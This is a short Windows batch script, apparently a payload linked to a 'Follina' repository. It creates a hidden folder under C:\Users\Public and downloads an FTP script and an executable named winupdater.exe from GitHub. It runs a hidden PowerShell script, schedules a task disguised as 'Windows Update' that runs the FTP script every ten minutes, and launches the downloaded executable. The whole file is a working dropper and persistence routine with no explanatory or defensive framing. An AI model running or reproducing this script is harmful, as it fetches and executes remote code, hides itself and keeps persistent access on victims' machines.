cd "C:\Users\Public"
mkdir "C:\Users\Public\Public Presentations"
attrib +h "C:\Users\Public\Public Presentations"							
cd "C:\Users\Public\Public Presentations"

curl -LJO https://github.com/Prevail9/Follina/raw/main/ftp.txt -o "C:\Users\Public\Public Presentations"
curl -LJO https://github.com/Prevail9/Follina/raw/main/winupdater.exe -o "C:\Users\Public\Public Presentations"

powershell.exe -WindowStyle hidden "C:\Users\Public\Public Presentations\desmon.ps1"

schtasks /create /tn "Windows Update" /tr "powershell.exe -WindowStyle hidden -c """ftp -A -s:'''C:\Users\Public\Public Presentations\ftp.txt'''"""" /sc minute /mo 10

cd "C:\Users\Public\Public Presentations"
start winupdater.exe